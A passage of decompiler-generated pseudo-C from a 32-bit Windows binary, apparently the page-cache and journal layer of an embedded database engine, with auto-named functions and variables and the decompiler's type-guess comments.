  int v10; // [esp+1Ch] [ebp-14h]
  char Buf1[8]; // [esp+24h] [ebp-Ch] BYREF
  int v12; // [esp+2Ch] [ebp-4h]

  if ( !*(_BYTE *)(a1 + 16) )
    return 0;
  if ( *(_BYTE *)(a1 + 5) == 4 )
    goto LABEL_14;
  v12 = (*(int (__cdecl **)(_DWORD))(**(_DWORD **)(a1 + 56) + 48))(*(_DWORD *)(a1 + 56));
  if ( (v12 & 0x200) != 0 )
    goto LABEL_21;
  if ( (memcpy(v8, &unk_100FEC08, sizeof(v8)),
        sub_10059C70(v9, *(_DWORD *)(a1 + 40)),
        v2 = sub_1006CDFD((_DWORD *)a1),
        v3 = *(_DWORD *)(a1 + 60),
        v10 = v4,
        (result = sub_100673FF(v3, (int)Buf1, 8, v2, v4)) == 0)
    && (memcmp(Buf1, &unk_100FEC08, 8u)
     || (result = sub_10067419(*(_DWORD *)(a1 + 60), (int)&unk_100FC459, 1, v2, v10)) == 0)
    || result == 522 )
  {
    if ( !*(_BYTE *)(a1 + 9)
      || (v12 & 0x400) != 0
      || (result = sub_10067447(*(_DWORD *)(a1 + 60), *(unsigned __int8 *)(a1 + 10))) == 0 )
    {
      result = sub_10067419(*(_DWORD *)(a1 + 60), (int)v8, 12, *(_DWORD *)(a1 + 80), *(_DWORD *)(a1 + 84));
      if ( !result )
      {
LABEL_21:
        if ( (v12 & 0x400) != 0
          || (result = sub_10067447(
                         *(_DWORD *)(a1 + 60),
                         *(unsigned __int8 *)(a1 + 10) | (*(_BYTE *)(a1 + 10) != 3 ? 0 : 16))) == 0 )
        {
LABEL_14:
          *(_BYTE *)(a1 + 16) = 0;
          *(_BYTE *)(a1 + 17) = 1;
          v6 = *(int **)(a1 + 168);
          for ( i = *v6; i; i = *(_DWORD *)(i + 28) )
            *(_WORD *)(i + 20) &= ~4u;
          v6[2] = v6[1];
          return 0;
        }
      }
    }
  }
  return result;
}
// 1006E191: variable 'v4' is possibly undefined
// 1006E128: using guessed type char var_1C[8];

//----- (1006E26C) --------------------------------------------------------
int __cdecl sub_1006E26C(int a1)
{
  int v1; // edi
  int *v3; // esi
  int v4; // eax
  _DWORD *v5; // ecx
  unsigned int v6; // ebx
  __int64 v7; // rax
  int v8; // [esp+Ch] [ebp-8h]
  int v9; // [esp+10h] [ebp-4h]

  v1 = a1;
  if ( !a1 )
    return 0;
  v3 = *(int **)(a1 + 16);
  v4 = sub_1006E07D(4, (int)v3);
  v5 = (_DWORD *)v3[14];
  v9 = v4;
  if ( !*v5 )
    v9 = sub_10067457(v3[30] | 0x1E, *v3, 0, (int)v5, 0);
  if ( !v9 )
  {
    while ( v1 )
    {
      v6 = *(_DWORD *)(v1 + 12);
      if ( v6 <= v3[6] && (*(_BYTE *)(v1 + 20) & 0x20) == 0 )
      {
        v7 = (v6 - 1) * (__int64)v3[31];
        v8 = *(_DWORD *)v1;
        v9 = sub_10067419(v3[14], *(_DWORD *)v1, v3[31], v7, SHIDWORD(v7));
        if ( v6 == 1 )
          memcpy(v3 + 24, (const void *)(v8 + 24), 0x10u);
        if ( v6 > v3[8] )
          v3[8] = v6;
        sub_1008229D(v3[43], v6, *(_DWORD *)v1);
        v1 = a1;
      }
      a1 = *(_DWORD *)(v1 + 8);
      if ( v9 )
        break;
      v1 = *(_DWORD *)(v1 + 8);
    }
  }
  return v9;
}

//----- (1006E342) --------------------------------------------------------
int __usercall sub_1006E342@<eax>(int *a1@<ebx>)
{
  _DWORD *v1; // esi
  _DWORD *v2; // eax
  int v3; // edi
  int result; // eax
  int v5; // [esp+14h] [ebp-4h]

  v1 = (_DWORD *)a1[4];
  v2 = (_DWORD *)v1[16];
  if ( !*v2
    || (v3 = v1[12] * (v1[31] + 4), v5 = *a1, (result = sub_1006CCC4((int)v2, v3, 0)) == 0)
    && (result = sub_10067419(v1[16], v5, v1[31], v3 + 4, ((unsigned __int64)(unsigned int)v3 + 4) >> 32)) == 0 )
  {
    ++v1[12];
    return sub_1006D3C9(a1[3], (int)v1);
  }
  return result;
}

//----- (1006E3AB) --------------------------------------------------------
int __cdecl sub_1006E3AB(int a1, int a2)
{
  int v2; // ebx

  if ( *(_DWORD *)(a1 + 36) || *(_BYTE *)(a1 + 20) && (*(_BYTE *)(a2 + 20) & 4) != 0 )
    return 0;
  if ( (*(_BYTE *)(a2 + 20) & 4) == 0 )
    goto LABEL_20;
  v2 = sub_1006E128(a1);
  if ( !v2 )
  {
    if ( *(_BYTE *)(a1 + 9)
      && *(_BYTE *)(a1 + 5) != 4
      && ((*(int (__cdecl **)(_DWORD))(**(_DWORD **)(a1 + 56) + 48))(*(_DWORD *)(a1 + 56)) & 0x200) == 0 )
    {
      *(_DWORD *)(a1 + 40) = 0;
      v2 = sub_1006CEF8(a1);
    }
    if ( !v2 )
    {
LABEL_20:
      if ( *(_DWORD *)(a2 + 12) <= *(_DWORD *)(a1 + 24) || !sub_1006CC49(a2) || (v2 = sub_1006E342((int *)a2)) == 0 )
      {
        *(_DWORD *)(a2 + 8) = 0;
        v2 = sub_1006E26C(a2);
        if ( !v2 )
          sub_10069369((_DWORD *)a2);
      }
    }
  }
  return sub_1006D466(v2, a1);
}

//----- (1006E459) --------------------------------------------------------
int __usercall sub_1006E459@<eax>(unsigned int a1@<eax>, int a2@<ecx>, int *a3, char *Str1, int a5)
{
  int v6; // eax
  _BYTE *v7; // ebx
  unsigned int v8; // eax
  int v9; // edi
  int v11; // eax
  _BYTE *v12; // eax
  int v13; // esi
  char *v14; // eax
  int v15; // edi
  char *v16; // eax
  char *v17; // eax
  char *v18; // eax
  char *v19; // eax
  int v20; // ebx
  unsigned int v21; // eax
  _DWORD *v22; // esi
  char v23; // al
  size_t v24; // [esp-4h] [ebp-30h]
  int v25; // [esp+Ch] [ebp-20h]
  BOOL v26; // [esp+10h] [ebp-1Ch]
  char v27; // [esp+14h] [ebp-18h]
  int v28; // [esp+18h] [ebp-14h]
  int v29; // [esp+1Ch] [ebp-10h] BYREF
  int v30; // [esp+20h] [ebp-Ch] BYREF
  size_t Size; // [esp+24h] [ebp-8h]
  unsigned int v32; // [esp+28h] [ebp-4h]
  char *Str1a; // [esp+38h] [ebp+Ch]

  v26 = (a1 & 1) == 0;
  v25 = (a1 >> 1) & 1;
  v6 = *(_DWORD *)(a2 + 4);
  v7 = 0;
  v30 = 0;
  v27 = 0;
  v28 = 0;
  Size = 0;
  v29 = 1024;
  if ( v6 <= 40 )
  {
    v32 = 40;
    v8 = 40;
  }
  else
  {
    v8 = (v6 + 7) & 0xFFFFFFF8;
    v32 = v8;
  }
  *a3 = 0;
  if ( Str1 && *Str1 )
  {
    v9 = *(_DWORD *)(a2 + 8) + 1;
    v7 = (_BYTE *)sub_10058C4C(2 * v9);
    if ( !v7 )
      return 7;
    v11 = strcmp(Str1, aMemory_1);
    *v7 = 0;
    if ( v11 )
      v30 = (*(int (__cdecl **)(int, char *, int, _BYTE *))(a2 + 36))(a2, Str1, v9, v7);
    else
      v28 = 1;
    v12 = sub_10059297(v7);
    Size = (size_t)v12;
    if ( v30 )
      goto LABEL_14;
    if ( (int)(v12 + 8) > *(_DWORD *)(a2 + 8) )
    {
      v30 = 14;
LABEL_14:
      v13 = v30;
LABEL_15:
      sub_10058E74((int)v7);
      return v13;
    }
    v8 = v32;
  }
  v14 = (char *)sub_10059025(((*(_DWORD *)(a2 + 4) + 7) & 0xFFFFFFF8) + 2 * (Size + v8) + 234);
  if ( !v14 )
  {
    v13 = 7;
    goto LABEL_15;
  }
  v15 = (int)v14;
  v16 = v14 + 176;
  *(_DWORD *)(v15 + 168) = v16;
  v16 += 48;
  *(_DWORD *)(v15 + 56) = v16;
  v17 = &v16[(*(_DWORD *)(a2 + 4) + 7) & 0xFFFFFFF8];
  *(_DWORD *)(v15 + 64) = v17;
  v18 = &v17[v32];
  *(_DWORD *)(v15 + 60) = v18;
  v19 = &v18[v32];
  *(_DWORD *)(v15 + 132) = v19;
  if ( v7 )
  {
    v24 = Size;
    *(_DWORD *)(v15 + 136) = &v19[Size + 1];
    memcpy(v19, v7, v24);
    memcpy(*(void **)(v15 + 136), v7, Size);
    memcpy((void *)(Size + *(_DWORD *)(v15 + 136)), aJournal, 8u);
    if ( !**(_BYTE **)(v15 + 132) )
      **(_BYTE **)(v15 + 136) = 0;
    sub_10058E74((int)v7);
  }
  *(_DWORD *)v15 = a2;
  *(_DWORD *)(v15 + 120) = a5;
  if ( Str1 && *Str1 && !v28 )
  {
    v30 = 0;
    v20 = sub_10067457(a5, a2, *(_DWORD *)(v15 + 132), *(_DWORD *)(v15 + 56), (int)&v30);
    Str1a = (char *)(v30 & 1);
    if ( v20 )
    {
LABEL_34:
      sub_100673EE(*(_DWORD *)(v15 + 56));
      sub_10058E74(v15);
      return v20;
    }
    if ( (v30 & 1) == 0 )
    {
      sub_1006DA69(v15);
      v21 = *(_DWORD *)(v15 + 112);
      if ( v21 > 0x400 )
      {
        if ( v21 <= 0x1000 )
          v29 = (unsigned __int16)v21;
        else
          v29 = 4096;
      }
    }
  }
  else
  {
    v27 = 1;
    *(_BYTE *)(v15 + 14) = 4;
    Str1a = (char *)(a5 & 1);
  }
  v20 = sub_1006DEE6(v15, (unsigned __int16 *)&v29, -1);
  if ( v20 )
    goto LABEL_34;
  v22 = *(_DWORD **)(v15 + 168);
  memset(v22, 0, 0x30u);
  v22[5] = (unsigned __int16)v29;
  v23 = 0;
  v22[6] = 80;
  v22[9] = v15;
  v22[4] = 100;
  v22[7] = v28 == 0;
  v22[8] = v28 == 0 ? sub_1006E3AB : 0;
  *(_BYTE *)(v15 + 6) = v26;
  if ( v25 && Str1a )
    v23 = 1;
  *(_BYTE *)(v15 + 7) = v23;
  *(_BYTE *)(v15 + 11) = v27;
  *(_BYTE *)(v15 + 4) = v27;
  *(_BYTE *)(v15 + 18) = v27;
  *(_BYTE *)(v15 + 8) = v27;
  *(_DWORD *)(v15 + 160) = -1;
  *(_DWORD *)(v15 + 164) = -1;
  *(_BYTE *)(v15 + 21) = v28;
  *(_DWORD *)(v15 + 128) = 50000;
  *(_BYTE *)(v15 + 13) = v28;
  *(_BYTE *)(v15 + 12) = (_BYTE)Str1a;
  *(_BYTE *)(v15 + 9) = v27 == 0;
  *(_BYTE *)(v15 + 10) = 2;
  *(_WORD *)(v15 + 116) = 80;
  sub_1006DA69(v15);
  if ( v26 )
  {
    if ( v28 )
      *(_BYTE *)(v15 + 5) = 4;
  }
  else
  {
    *(_BYTE *)(v15 + 5) = 2;
  }
  *(_DWORD *)(v15 + 148) = sub_10062108;
  *a3 = v15;
  return 0;
}

//----- (1006E76C) --------------------------------------------------------
int __usercall sub_1006E76C@<eax>(int *a1@<eax>, _DWORD *a2)
{
  int v3; // ebx
  int v4; // edi
  int v5; // eax
  int v7; // [esp-Ch] [ebp-28h]
  int v8; // [esp-8h] [ebp-24h]
  int v9; // [esp+Ch] [ebp-10h] BYREF
  int v10; // [esp+10h] [ebp-Ch] BYREF
  int v11; // [esp+14h] [ebp-8h] BYREF
  char v12; // [esp+1Bh] [ebp-1h] BYREF

  *a2 = 0;
  v3 = *a1;
  v4 = (*(int (__cdecl **)(int, int, _DWORD, int *))(*a1 + 32))(*a1, a1[34], 0, &v11);
  if ( !v4 )
  {
    if ( v11 )
    {
      v4 = (*(int (__cdecl **)(int, int *))(*(_DWORD *)a1[14] + 36))(a1[14], &v10);
      if ( !v4 && !v10 )
      {
        v4 = sub_1006DFE2(&v9, (int)a1);
        if ( !v4 )
        {
          if ( v9 )
          {
            v8 = a1[15];
            v7 = a1[34];
            v9 = 2049;
            v5 = sub_10067457(2049, v3, v7, v8, (int)&v9);
            v4 = v5;
            if ( v5 )
            {
              if ( v5 == 14 )
              {
                *a2 = 1;
                return 0;
              }
            }
            else
            {
              v12 = 0;
              v4 = (*(int (__cdecl **)(int, char *, int, _DWORD, _DWORD))(*(_DWORD *)a1[15] + 8))(a1[15], &v12, 1, 0, 0);
              if ( v4 == 522 )
                v4 = 0;
              sub_100673EE(a1[15]);
              *a2 = v12 != 0;
            }
          }
          else
          {
            sub_10069106();
            if ( !(*(int (__cdecl **)(int, int))(*(_DWORD *)a1[14] + 28))(a1[14], 2) )
            {
              (*(void (__cdecl **)(int, int, _DWORD))(v3 + 28))(v3, a1[34], 0);
              (*(void (__cdecl **)(int, int))(*(_DWORD *)a1[14] + 32))(a1[14], 1);
            }
            sub_10069112();
          }
        }
      }
    }
  }
  return v4;
}
// 1006E76C: using guessed type int var_8;

//----- (1006E88D) --------------------------------------------------------
int __usercall sub_1006E88D@<eax>(int *a1@<esi>)
{
  int *v1; // edi
  __int64 v3; // rax
  int v4; // ebx
  int v5; // [esp+Ch] [ebp-4h]

  v1 = (int *)a1[4];
  v5 = a1[3];
  if ( *(_DWORD *)v1[14] )
  {
    v3 = (unsigned int)(a1[3] - 1) * (__int64)v1[31];
    v4 = sub_100673FF(v1[14], *a1, v1[31], v3, SHIDWORD(v3));
    if ( v4 == 522 )
      v4 = 0;
    if ( v5 == 1 )
      memcpy(v1 + 24, (const void *)(*a1 + 24), 0x10u);
    return v4;
  }
  else
  {
    memset((void *)*a1, 0, v1[31]);
    return 0;
  }
}

//----- (1006E907) --------------------------------------------------------
int __cdecl sub_1006E907(int a1)
{
  int v1; // esi
  bool v2; // zf
  int result; // eax
  int v4; // edi
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // esi
  _DWORD *v9; // eax
  int v10; // eax
  int v11; // [esp-Ch] [ebp-38h]
  int v12; // [esp-8h] [ebp-34h]
  char Buf2[16]; // [esp+Ch] [ebp-20h] BYREF
  int v14; // [esp+1Ch] [ebp-10h] BYREF
  int v15; // [esp+20h] [ebp-Ch] BYREF
  int v16; // [esp+24h] [ebp-8h]

  v1 = a1;
  v2 = *(_BYTE *)(a1 + 13) == 0;
  v16 = 0;
  v15 = 0;
  if ( v2 || (result = *(_DWORD *)(a1 + 36)) == 0 )
  {
    if ( *(_DWORD *)(a1 + 36) )
    {
      if ( **(_DWORD **)(a1 + 60) || *(_DWORD *)(a1 + 136) )
        v15 = 1;
      *(_DWORD *)(a1 + 36) = 0;
      sub_1006D34A(a1);
    }
    if ( *(_BYTE *)(a1 + 14) && !v15 )
      return v16;
    v2 = *(_BYTE *)(a1 + 7) == 0;
    v4 = *(_DWORD *)a1;
    v14 = 0;
    if ( v2 )
    {
      v5 = sub_1006E07D(1, a1);
      v16 = v5;
      if ( v5 )
        return sub_1006D466(v5, a1);
    }
    else
    {
      *(_BYTE *)(a1 + 14) = 1;
    }
    if ( !v15 )
    {
      v16 = sub_1006E76C((int *)a1, &v14);
      if ( v16 )
        goto LABEL_46;
      if ( !v14 )
        goto LABEL_35;
    }
    if ( *(_BYTE *)(a1 + 14) < 4u )
    {
      v6 = (*(int (__cdecl **)(_DWORD, int))(**(_DWORD **)(a1 + 56) + 28))(*(_DWORD *)(a1 + 56), 4);
      v16 = v6;
      if ( v6 )
      {
        v7 = sub_1006D466(v6, a1);
LABEL_20:
        v16 = v7;
        goto LABEL_45;
      }
      *(_BYTE *)(a1 + 14) = 4;
    }
    if ( !**(_DWORD **)(a1 + 60) )
    {
      v16 = (*(int (__cdecl **)(int, _DWORD, _DWORD, int *))(v4 + 32))(v4, *(_DWORD *)(a1 + 136), 0, &v15);
      if ( v16 )
        goto LABEL_46;
      if ( v15 )
      {
        v12 = *(_DWORD *)(a1 + 60);
        v11 = *(_DWORD *)(a1 + 136);
        v14 = 0;
        v16 = sub_10067457(2050, v4, v11, v12, (int)&v14);
        if ( v16 )
          goto LABEL_46;
        if ( (v14 & 1) != 0 )
        {
          v8 = *(_DWORD *)(a1 + 60);
          v16 = 14;
          sub_100673EE(v8);
          v1 = a1;
        }
      }
      else
      {
        v16 = sub_1006D4A7((_DWORD *)a1, 0);
      }
    }
    if ( v16 )
      goto LABEL_46;
    v9 = *(_DWORD **)(v1 + 60);
    *(_BYTE *)(v1 + 17) = 0;
    *(_DWORD *)(v1 + 72) = 0;
    *(_DWORD *)(v1 + 76) = 0;
    *(_BYTE *)(v1 + 19) = 0;
    *(_DWORD *)(v1 + 80) = 0;
    *(_DWORD *)(v1 + 84) = 0;
    if ( !*v9 )
      goto LABEL_35;
    v10 = sub_1006DAA3((unsigned int *)v1, (_BYTE *)1);
    v16 = v10;
    if ( v10 )
    {
      v16 = sub_1006D466(v10, v1);
    }
    else
    {
LABEL_35:
      if ( *(_DWORD *)(v1 + 172)
        || *(_DWORD *)(*(_DWORD *)(v1 + 168) + 40) && dword_101821B8(*(_DWORD *)(*(_DWORD *)(v1 + 168) + 40)) > 0 )
      {
        sub_1006DFE2(0, v1);
        v1 = a1;
        v7 = *(_DWORD *)(a1 + 36);
        if ( !v7 )
        {
          if ( *(_DWORD *)(a1 + 24) )
          {
            v1 = a1;
            v16 = (*(int (__cdecl **)(_DWORD, char *, int, int, _DWORD))(**(_DWORD **)(a1 + 56) + 8))(
                    *(_DWORD *)(a1 + 56),
                    Buf2,
                    16,
                    24,
                    0);
            if ( v16 )
              goto LABEL_46;
          }
          else
          {
            memset(Buf2, 0, sizeof(Buf2));
          }
          if ( memcmp((const void *)(v1 + 96), Buf2, 0x10u) )
            sub_1006D34A(a1);
          v1 = a1;
          goto LABEL_45;
        }
        goto LABEL_20;
      }
    }
LABEL_45:
    if ( !v16 )
      return v16;
LABEL_46:
    sub_1006D405(v1);
    return v16;
  }
  return result;
}
// 101821B8: using guessed type int (__cdecl *dword_101821B8)(_DWORD);

//----- (1006EB41) --------------------------------------------------------
void __cdecl sub_1006EB41(int a1)
{
  if ( !*(_DWORD *)(*(_DWORD *)(a1 + 168) + 12) && (!*(_BYTE *)(a1 + 4) || *(__int64 *)(a1 + 72) > 0) )
    sub_1006D483(a1);
}

//----- (1006EB74) --------------------------------------------------------
int __usercall sub_1006EB74@<eax>(int a1@<ebx>, unsigned int a2, _DWORD *a3, int a4)
{
  int v4; // eax
  int v5; // esi
  int v6; // eax
  bool v7; // zf
  int v9; // [esp-4h] [ebp-18h]
  int v10; // [esp+Ch] [ebp-8h] BYREF
  int *v11; // [esp+10h] [ebp-4h]

  v4 = *(_DWORD *)(a1 + 36);
  if ( !v4 || v4 == 13 )
    v4 = sub_100691BB(*(_DWORD *)(a1 + 168), a2, 1, a3);
  v5 = v4;
  if ( v4 )
    goto LABEL_25;
  v6 = *a3;
  v7 = *(_DWORD *)(*a3 + 16) == 0;
  v11 = (int *)*a3;
  if ( !v7 )
    return 0;
  *(_DWORD *)(v6 + 16) = a1;
  if ( a2 > 0x7FFFFFFF || a2 == 0x40000000 / *(_DWORD *)(a1 + 124) + 1 )
  {
    v9 = 11;
LABEL_23:
    v5 = v9;
    goto LABEL_24;
  }
  v5 = sub_1006DFE2(&v10, a1);
  if ( !v5 )
  {
    if ( !*(_BYTE *)(a1 + 13) && v10 >= (int)a2 && !a4 )
    {
      v5 = sub_1006E88D(v11);
      if ( !v5 )
        return 0;
      goto LABEL_24;
    }
    if ( a2 <= *(_DWORD *)(a1 + 128) )
    {
      if ( a4 )
      {
        sub_10069106();
        if ( a2 <= *(_DWORD *)(a1 + 28) )
          sub_10070C77(*(_DWORD **)(a1 + 52), a2);
        sub_1006D3C9(a2, a1);
        sub_10069112();
      }
      memset((void *)*v11, 0, *(_DWORD *)(a1 + 124));
      return 0;
    }
    v9 = 13;
    goto LABEL_23;
  }
LABEL_24:
  sub_10069323(v11);
LABEL_25:
  sub_1006EB41(a1);
  *a3 = 0;
  return v5;
}
// 1006EB41: using guessed type _DWORD __cdecl sub_1006EB41(_DWORD);

//----- (1006EC75) --------------------------------------------------------
void __usercall sub_1006EC75(int a1@<eax>)
{
  int v1; // esi

  if ( a1 )
  {
    v1 = *(_DWORD *)(a1 + 16);
    sub_100692F6(a1);
    sub_1006EB41(v1);
  }
}

//----- (1006EC95) --------------------------------------------------------
int __thiscall sub_1006EC95(int this)
{
  int v1; // edi
  _DWORD *v2; // esi

  v1 = 0;
  if ( **(_DWORD **)(this + 60) )
  {
    v2 = *(_DWORD **)(this + 64);
    if ( !*v2 )
    {
      if ( *(_BYTE *)(this + 5) == 4 || *(_BYTE *)(this + 22) )
        sub_10081C60(v2);
      else
        return sub_10067457(8222, *(_DWORD *)this, 0, (int)v2, 0);
    }
  }
  return v1;
}

//----- (1006ECD4) --------------------------------------------------------
int __usercall sub_1006ECD4@<eax>(int a1@<ebx>)
{
  int result; // eax
  _DWORD *v2; // eax
  _DWORD *v3; // esi
  int v4; // esi
  int v5; // [esp+Ch] [ebp-4h]

  v5 = *(_DWORD *)a1;
  result = *(_DWORD *)(a1 + 36);
  if ( !result )
  {
    sub_1006DFE2(0, a1);
    v2 = sub_10070BE1(*(_DWORD *)(a1 + 24));
    *(_DWORD *)(a1 + 52) = v2;
    if ( !v2 )
      return 7;
    v3 = *(_DWORD **)(a1 + 60);
    if ( !*v3 )
    {
      if ( *(_BYTE *)(a1 + 5) == 4 )
      {
        sub_10081C60(v3);
      }
      else
      {
        v4 = sub_10067457((*(_BYTE *)(a1 + 11) != 0 ? 4104 : 2048) | 6, v5, *(_DWORD *)(a1 + 136), (int)v3, 0);
        if ( v4 )
        {
LABEL_12:
          sub_10070E6B(*(_DWORD *)(a1 + 52));
          *(_DWORD *)(a1 + 52) = 0;
          return v4;
        }
      }
    }
    *(_DWORD *)(a1 + 28) = *(_DWORD *)(a1 + 24);
    *(_BYTE *)(a1 + 17) = 0;
    *(_BYTE *)(a1 + 16) = 0;
    *(_DWORD *)(a1 + 40) = 0;
    *(_DWORD *)(a1 + 72) = 0;
    *(_DWORD *)(a1 + 76) = 0;
    *(_BYTE *)(a1 + 19) = 0;
    *(_DWORD *)(a1 + 80) = 0;
    *(_DWORD *)(a1 + 84) = 0;
    v4 = sub_1006CEF8(a1);
    if ( !v4 )
    {
      if ( *(_DWORD *)(a1 + 92) )
        v4 = sub_1006EC95(a1);
      if ( !v4 )
        return v4;
    }
    goto LABEL_12;
  }
  return result;
}

//----- (1006ED9F) --------------------------------------------------------
int __usercall sub_1006ED9F@<eax>(int a1@<eax>, int a2, char a3)
{
  int v4; // ebx
  bool v5; // zf

  v4 = 0;
  v5 = *(_BYTE *)(a1 + 14) == 1;
  *(_BYTE *)(a1 + 22) = a3;
  if ( !v5 )
  {
    if ( !**(_DWORD **)(a1 + 60) || *(_QWORD *)(a1 + 72) )
      return v4;
    goto LABEL_10;
  }
  v4 = (*(int (__cdecl **)(_DWORD, int))(**(_DWORD **)(a1 + 56) + 28))(*(_DWORD *)(a1 + 56), 2);
  if ( v4 )
    goto LABEL_11;
  *(_BYTE *)(a1 + 14) = 2;
  if ( a2 )
    v4 = sub_1006E07D(4, a1);
  if ( v4 )
    goto LABEL_11;
  if ( *(_BYTE *)(a1 + 5) != 2 )
  {
LABEL_10:
    v4 = sub_1006ECD4(a1);
    if ( v4 )
LABEL_11:
      sub_1006D4A7((_DWORD *)a1, 0);
  }
  return v4;
}

//----- (1006EE12) --------------------------------------------------------
int __cdecl sub_1006EE12(int a1)
{
  int *v1; // edi
  int v2; // esi
  int result; // eax
  unsigned int v4; // ebx
  int v5; // ecx
  int v6; // eax
  bool v7; // cf
  unsigned int v8; // edi
  int v9; // [esp+Ch] [ebp-8h]
  int v10; // [esp+10h] [ebp-4h]
  int v11; // [esp+10h] [ebp-4h]

  v1 = (int *)a1;
  v2 = *(_DWORD *)(a1 + 16);
  v9 = *(_DWORD *)a1;
  result = *(_DWORD *)(v2 + 36);
  v10 = 0;
  if ( !result )
  {
    if ( *(_BYTE *)(v2 + 12) )
      return 3;
    sub_1006934E(a1);
    if ( sub_10070BFA(*(_DWORD *)(a1 + 12), *(unsigned int **)(*(_DWORD *)(a1 + 16) + 52)) && !sub_1006CC49(a1) )
    {
      *(_BYTE *)(v2 + 15) = 1;
      goto LABEL_25;
    }
    result = sub_1006ED9F(v2, 0, *(_BYTE *)(v2 + 22));
    v10 = result;
    if ( !result )
    {
      if ( **(_DWORD **)(v2 + 60) || *(_BYTE *)(v2 + 5) == 2 || (result = sub_1006ECD4(v2), (v10 = result) == 0) )
      {
        *(_BYTE *)(v2 + 15) = 1;
        v4 = *(_DWORD *)(a1 + 12);
        if ( !sub_10070BFA(v4, *(unsigned int **)(*(_DWORD *)(a1 + 16) + 52)) && **(_DWORD **)(v2 + 60) )
        {
          if ( v4 > *(_DWORD *)(v2 + 28) )
          {
            if ( !*(_BYTE *)(v2 + 17) && !*(_BYTE *)(v2 + 8) )
            {
              *(_WORD *)(a1 + 20) |= 4u;
              *(_BYTE *)(v2 + 16) = 1;
            }
          }
          else
          {
            sub_1006D5D4(v9);
            v5 = sub_1006CCC4(*(_DWORD *)(v2 + 60), *(_DWORD *)(v2 + 72), *(_DWORD *)(v2 + 76));
            if ( !v5 )
            {
              v5 = sub_10067419(
                     *(_DWORD *)(v2 + 60),
                     v9,
                     *(_DWORD *)(v2 + 124),
                     *(_DWORD *)(v2 + 72) + 4,
                     (unsigned __int64)(*(_QWORD *)(v2 + 72) + 4i64) >> 32);
              *(_QWORD *)(v2 + 72) += *(_DWORD *)(v2 + 124) + 4;
              if ( !v5 )
              {
                v6 = sub_1006CCC4(*(_DWORD *)(v2 + 60), *(_DWORD *)(v2 + 72), *(_DWORD *)(v2 + 76));
                v7 = __CFADD__(*(_DWORD *)(v2 + 72), 4);
                *(_DWORD *)(v2 + 72) += 4;
                v5 = v6;
                *(_DWORD *)(v2 + 76) += v7;
              }
            }
            if ( !*(_BYTE *)(v2 + 8) )
            {
              *(_WORD *)(a1 + 20) |= 4u;
              *(_BYTE *)(v2 + 16) = 1;
            }
            if ( v5 )
              return v5;
            ++*(_DWORD *)(v2 + 40);
            v11 = sub_10070C77(*(_DWORD **)(v2 + 52), *(_DWORD *)(a1 + 12));
            v10 = sub_1006D3C9(*(_DWORD *)(a1 + 12), v2) | v11;
            if ( v10 )
              return v10;
            v1 = (int *)a1;
          }
        }
        if ( sub_1006CC49((int)v1) )
          v10 = sub_1006E342(v1);
LABEL_25:
        v8 = v1[3];
        if ( *(_DWORD *)(v2 + 24) < v8 )
          *(_DWORD *)(v2 + 24) = v8;
        return v10;
      }
    }
  }
  return result;
}

//----- (1006EFC8) --------------------------------------------------------
int __cdecl sub_1006EFC8(int a1)
{
  int v1; // esi
  unsigned int v2; // eax
  int v3; // ebx
  unsigned int v4; // eax
  int v5; // eax
  unsigned int v6; // edi
  unsigned int v7; // eax
  int v8; // ebx
  int v9; // edi
  int v10; // eax
  int v11; // ecx
  int v13; // [esp+Ch] [ebp-1Ch]
  int v14; // [esp+10h] [ebp-18h]
  int v15; // [esp+14h] [ebp-14h]
  int v16; // [esp+14h] [ebp-14h]
  int v17; // [esp+18h] [ebp-10h]
  unsigned int v18; // [esp+1Ch] [ebp-Ch] BYREF
  int v19; // [esp+20h] [ebp-8h]
  int v20; // [esp+24h] [ebp-4h]

  v1 = *(_DWORD *)(a1 + 16);
  v2 = *(_DWORD *)(v1 + 112) / *(_DWORD *)(v1 + 124);
  v13 = 0;
  v15 = v2;
  if ( v2 <= 1 )
    return sub_1006EE12(a1);
  v17 = 0;
  *(_BYTE *)(v1 + 20) = 1;
  v3 = ((*(_DWORD *)(a1 + 12) - 1) & ~(v2 - 1)) + 1;
  v19 = v3;
  sub_1006DFE2(&v18, v1);
  v4 = *(_DWORD *)(a1 + 12);
  if ( v4 <= v18 )
  {
    v5 = v15;
    if ( v3 + v15 - 1 > v18 )
    {
      v14 = v18 - v3 + 1;
      goto LABEL_5;
    }
  }
  else
  {
    v5 = v4 - v3 + 1;
  }
  v14 = v5;
LABEL_5:
  v16 = 0;
  if ( v14 > 0 )
  {
    v6 = v3;
    while ( !v13 )
    {
      if ( v6 == *(_DWORD *)(a1 + 12) || !sub_10070BFA(v6, *(unsigned int **)(v1 + 52)) )
      {
        if ( v6 != 0x40000000 / *(_DWORD *)(v1 + 124) + 1 )
        {
          if ( v6 )
          {
            v13 = sub_1006EB74(v1, v6, &v18, 0);
            if ( !v13 )
            {
              v8 = v18;
              v13 = sub_1006EE12(v18);
              if ( (*(_BYTE *)(v8 + 20) & 4) != 0 )
                v17 = 1;
              v20 = *(_DWORD *)(v8 + 16);
              sub_100692F6(v8);
              sub_1006EB41(v20);
            }
            v3 = v19;
          }
          else
          {
            v13 = 11;
          }
        }
      }
      else
      {
        v7 = sub_1006D326(v1, v6);
        v18 = v7;
        if ( v7 )
        {
          if ( (*(_BYTE *)(v7 + 20) & 4) != 0 )
            v17 = 1;
          v20 = *(_DWORD *)(v7 + 16);
          sub_100692F6(v7);
          sub_1006EB41(v20);
        }
      }
      ++v16;
      ++v6;
      if ( v16 >= v14 )
      {
        v9 = 0;
        if ( !v13 && v17 )
        {
          do
          {
            v10 = sub_1006D326(v1, v9 + v3);
            if ( v10 )
            {
              v11 = *(_DWORD *)(v10 + 16);
              *(_WORD *)(v10 + 20) |= 4u;
              v20 = v11;
              sub_100692F6(v10);
              sub_1006EB41(v20);
            }
            ++v9;
          }
          while ( v9 < v14 );
        }
        break;
      }
    }
  }
  *(_BYTE *)(v1 + 20) = 0;
  return v13;
}
// 1006EB41: using guessed type _DWORD __cdecl sub_1006EB41(_DWORD);

//----- (1006F196) --------------------------------------------------------
int __usercall sub_1006F196@<eax>(int a1@<eax>)
{
  int v2; // esi
  int v3; // eax
  int v4; // edi
  int v5; // eax
  int v7; // [esp+Ch] [ebp-4h] BYREF

  v2 = 0;
  if ( *(_DWORD *)(a1 + 24) )
  {
    v3 = sub_1006EB74(a1, 1u, &v7, 0);
    v4 = v7;
    v2 = v3;
    if ( !v3 )
    {
      v2 = sub_1006EFC8(v7);
      if ( !v2 )
      {
        v5 = sub_10059C56((_BYTE *)(a1 + 96));
